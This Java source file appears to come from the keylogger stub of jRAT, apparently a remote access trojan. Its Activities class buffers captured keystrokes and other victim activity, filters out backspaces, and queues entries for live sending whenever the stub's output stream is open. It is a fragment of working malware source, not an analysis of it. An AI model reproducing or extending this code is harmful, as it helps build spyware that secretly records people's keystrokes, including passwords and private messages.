package io.jrat.plugin.keylogger.stub.activities;

import io.jrat.plugin.keylogger.stub.StubPlugin;

import java.util.ArrayList;
import java.util.List;


public class Activities {

	public static final List<Activity> activities = new ArrayList<Activity>();
	public static final List<Activity> online = new ArrayList<Activity>();

	public static synchronized void add(Activity activity) {
		/*if (activity instanceof Key && unix && activities.size() > 0 && ((Key)activities.get(activities.size() - 1)).getKey() == (((Key)activity).getKey())) {
			return;
		}*/		
				
		if (!(activity instanceof Key) || activity instanceof Key && ((Key)activity).getChar() != '\b') {
			activities.add(activity);
		}
		
		if (StubPlugin.dos != null) {
			if (online.size() > 2500) {
				online.clear();
			}
			online.add(activity);
		}
	}
}
